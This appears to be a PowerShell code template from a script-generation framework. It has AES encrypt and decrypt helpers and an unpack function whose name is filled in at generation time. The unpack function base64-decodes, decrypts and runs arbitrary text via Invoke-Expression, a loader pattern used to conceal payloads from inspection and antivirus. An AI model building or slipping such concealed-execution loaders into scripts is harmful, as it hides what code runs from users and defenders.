$KEY = ${{symbol_name("KEY")}}

function Encrypt-AES {
    param(
        [Byte[]]$buffer,
        [Byte[]]$key
  	)

    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    $aesManaged.Key = [byte[]]$key[0..15]

    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($buffer, 0, $buffer.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData

    try{$aesManaged.Dispose()}catch{} {# This method does not exist in PS2 #}
    $fullData
}

function Decrypt-AES {
    param(
        [Byte[]]$buffer,
        [Byte[]]$key
  	)

    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    $aesManaged.Key = [byte[]]$key[0..15]
    $aesManaged.IV = [byte[]]$buffer[0..15]

    $decryptor = $aesManaged.CreateDecryptor()
    $decryptedData = $decryptor.TransformFinalBlock($buffer, 16, $buffer.Length-16);

    try{$aesManaged.Dispose()}catch{} {# This method does not exist in PS2 #}
    $decryptedData
}

function {{symbol_name("Unpack")}} {
    $Result = [System.Convert]::FromBase64String($args[0])
    $Result = Decrypt-AES $Result $KEY
    $Result = [System.Text.Encoding]::UTF8.GetString($Result)
    $Result | Invoke-Expression
}
